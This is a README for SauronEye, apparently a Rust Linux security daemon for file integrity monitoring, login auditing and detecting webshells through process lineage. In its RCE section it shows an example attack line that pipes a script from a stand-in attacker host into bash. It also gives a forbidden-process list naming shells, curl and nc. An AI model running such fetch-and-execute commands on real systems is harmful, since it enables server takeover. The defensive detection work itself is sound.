# SauronEye 👁️

[![Rust](https://img.shields.io/badge/language-Rust-orange.svg)](https://www.rust-lang.org/)
[![License](https://img.shields.io/badge/license-MIT%20OR%20Apache--2.0-blue.svg)](LICENSE)
[![Security](https://img.shields.io/badge/security-Argon2id%20%7C%20BLAKE3-green.svg)](#security-architecture)

> **"The Eye That Sees All"** — High-Performance File Integrity Monitoring (FIM), Process Lineage Sentinel, Authentication Auditor, and RCE/Webshell Detector for Linux.

---

*Read this in other languages: [English](README.md) | [Português (Brasil)](README.pt-BR.md)*

---

## Overview

**SauronEye** is a lightweight, low-overhead security daemon built in Rust. It provides real-time visibility into filesystem tampering, unauthorized privilege elevation, and suspicious process executions on Linux production servers without depending on heavy agent frameworks.

---

## Key Features

- **⚡ Universal Hardware Portability (Zero AVX Lock-in):**
  Uses **BLAKE3** and **xxHash (XXH3/XXH64)** with automatic scalar fallback, avoiding CPU instruction traps on legacy servers and virtualized machines.
- **🧠 Context-Aware Tampering Detection:**
  Correlates file modifications with `/proc` process lineage, active package manager locks (`dpkg`, `apt`, `yum`, `dnf`, `pacman`), and repository checksums to differentiate legitimate system upgrades from attacker tampering.
- **🛡️ RCE & Webshell Detection:**
  Continuously monitors protected service daemons (`nginx`, `apache`, `php-fpm`, `named`, `unbound`, `mysqld`, `redis`) and detects anomalous execution of interactive shells (`/bin/sh`, `/bin/bash`, `python`, `curl`, `nc`).
- **🔐 Auth & Login Auditing:**
  Tracks successful and failed user logins, sudo escalations, and SSH sessions in real time via PAM and Netlink Audit.
- **🔒 Hardened Storage & Self-Protection:**
  Embedded **SQLite3** in WAL mode with `WITHOUT ROWID` optimizations. The database and configuration files are compulsorily monitored against tampering.
- **🛡️ One-Time Init Guard:**
  The `init` setup is permanently locked once executed. Only authenticated administrators with **Argon2id** password verification can update the baseline (`sauroneye update`).
- **📲 Multi-Channel Async Alerts:**
  Instant notifications via **Telegram Bot API** and **WhatsApp** (Evolution API / Z-API / Custom Webhooks).

---

## 📊 Feature Comparison Matrix

How **SauronEye** compares against established security and integrity tools:

| Feature / Capability | **SauronEye** 👁️ | **AIDE** | **Tripwire** | **OSSEC / Wazuh** | **Falco** |
| :--- | :---: | :---: | :---: | :---: | :---: |
| **Language & Architecture** | **Rust** (Memory-Safe, Async) | C (Legacy) | C++ (Legacy) | C / Python (Complex Agent) | C++ / eBPF |
| **Real-Time FIM Monitoring** | ✅ Yes (`fanotify` / `inotify`) | ❌ Batch Cron | ❌ Batch Cron | ⚠️ Periodic / Inotify | ⚠️ Rule-based Syscall |
| **Context-Aware Update Filtering**<br>*(Distinguishes Package Updates from Attacks)* | ✅ **Native** (`/proc` + Locks + Pkg DB) | ❌ No (Manual baseline reset) | ❌ No (Manual baseline reset) | ❌ Complex custom rules | ⚠️ Syscall whitelist only |
| **RCE & Webshell Anomaly Detection**<br>*(Protected Daemons Spawning Shells)* | ✅ **Built-in** | ❌ No | ❌ No | ⚠️ Log-based regex | ✅ Yes (eBPF / Kernel) |
| **Hardware Portability**<br>*(Zero AVX Lock-in with SIMD fallback)* | ✅ **Yes** (BLAKE3 + xxHash) | ⚠️ MD5/SHA (Slow) | ⚠️ SHA-256 (Slow) | ⚠️ SHA-256 (High CPU) | ⚠️ Kernel eBPF dependent |
| **Embedded Zero-Config Storage** | ✅ **SQLite3 (WAL Mode)** | ❌ Plain text / Gzip | ❌ Proprietary DB | ❌ Elasticsearch / SQLite | ❌ None (Streaming only) |
| **One-Time Init & Anti-Tamper Guard** | ✅ **Yes** (Argon2id + Lock) | ❌ No | ❌ No | ⚠️ Manager-controlled | ❌ No |
| **Native Telegram & WhatsApp Alerts** | ✅ **Yes** (Async REST) | ❌ Email only | ❌ Email only | ⚠️ Via custom scripts/server | ⚠️ Webhook sidecar |
| **Resource Footprint & Dependencies** | 🚀 **Minimal** (Single static binary) | 🔹 Low (CLI only) | 🔹 Moderate | 🔴 Heavy (Server/Agent) | 🟡 Moderate (Kernel Driver) |

---

## Quick Start

### 1. Build from Source
```bash
cargo build --release
```

### 2. Initial Setup (One-Time Init)
```bash
# Initialize database, set admin password, and record baseline scan
sauroneye --config config.toml init
```

### 3. Run Monitoring Daemon
```bash
# Run in foreground
sauroneye --config config.toml run
```

### 4. Authenticated Baseline Update (After Maintenance)
```bash
# Requires admin password verification
sauroneye --config config.toml update
```

### 5. Check Sentinel Status
```bash
sauroneye --config config.toml status
```

---

## Configuration (`config.toml`)

All parameters are strictly typed and configured via `config.toml`. See [`config.toml.example`](config.toml.example) for the full specification:

```toml
[general]
hostname = "production-server-01"
log_level = "info"
poll_interval_ms = 500

[database]
path = "/var/lib/sauroneye/sauron.db"
enable_wal = true

[fim]
backend = "auto"
hash_algorithm = "blake3"
include_paths = ["/etc", "/usr/bin", "/usr/sbin", "/bin", "/sbin", "/boot", "/root/.ssh"]
exclude_paths = ["/etc/mtab", "/etc/resolv.conf", "*.swp", "*.tmp"]

[package_manager]
auto_detect = true
check_package_db = true

[auth_monitor]
enabled = true
monitor_successful_logins = true
monitor_failed_attempts = true

[rce_detector]
enabled = true
protected_services = ["nginx", "apache2", "httpd", "php-fpm", "named", "unbound"]
forbidden_children = ["/bin/sh", "/bin/bash", "/usr/bin/python*", "/usr/bin/curl", "/usr/bin/nc"]

[notifications.telegram]
enabled = true
bot_token = "YOUR_BOT_TOKEN_HERE"
chat_id = "-1001234567890"

[notifications.whatsapp]
enabled = false
endpoint_url = "https://api.myserver.com/message/sendText/instance"
api_key = "YOUR_API_KEY_HERE"
recipient_number = "5511999999999"
```

---

## 🛡️ Understanding `protected_services` & RCE Defense

### How It Works

Network daemons (such as Nginx, Apache, PHP-FPM, BIND/Named, Unbound, MySQL, and Redis) are designed to handle network traffic — **never** to invoke interactive command-line shells.

When an attacker successfully exploits a Remote Code Execution (RCE) or file upload vulnerability, the exploited daemon inevitably spawns a shell or utility binary:
```text
[nginx / php-fpm]  ──(anomalous spawn)──►  /bin/bash -c "curl attacker.com/rev.sh | bash"
```

**SauronEye** continuously inspects the Linux `/proc` filesystem and tracks process lineage (`PPID` ➔ `PID`). If a process whose parent command name matches **`protected_services`** attempts to execute any binary defined in **`forbidden_children`**, SauronEye intercepts the event in milliseconds and dispatches a **Critical Security Alert** containing:
- Monitored Service Name & Parent PID (`PPID`);
- Spawned Child Process Name & PID;
- Full command-line invocation (`cmdline`).

### How to Identify Active Daemons on Your Server

To discover the exact process names (`comm`) running on your server and populate `protected_services`:

1. **List listening services and their PIDs:**
   ```bash
   sudo ss -tulpn
   ```
2. **Find the exact kernel command name (`comm`):**
   ```bash
   # Replace <PID> with the actual process PID (e.g., 1100):
   cat /proc/<PID>/comm
   ```
3. **Alternatively, inspect common daemons directly:**
   ```bash
   ps -eo comm,pid,user,args | grep -E "nginx|apache|httpd|php|named|unbound|bind|mysql|mariadb|postgres|redis"
   ```
4. **Add them to `config.toml`:**
   ```toml
   [rce_detector]
   enabled = true
   protected_services = [
       "nginx",
       "apache2",
       "httpd",
       "php-fpm8.2",
       "named",
       "unbound",
       "mariadbd",
       "mysqld",
       "redis-server"
   ]
   ```

> **Note:** Do **not** include interactive login services like `sshd` or `login` in `protected_services`, as their legitimate purpose is opening user shells upon valid authentication.

---

## Installation & Deployment

For complete installation steps, systemd service configuration, and security hardening, see **[INSTALL.md](INSTALL.md)**.

---

## Architectural Documentation

For in-depth architectural blueprints and technical specifications, refer to:
- **[SauronEye_Plano_Arquitetural.pdf](SauronEye_Plano_Arquitetural.pdf)**

---

## License

Dual-licensed under either of:
- Apache License, Version 2.0 ([LICENSE-APACHE](LICENSE-APACHE) or http://www.apache.org/licenses/LICENSE-2.0)
- MIT license ([LICENSE-MIT](LICENSE-MIT) or http://opensource.org/licenses/MIT)
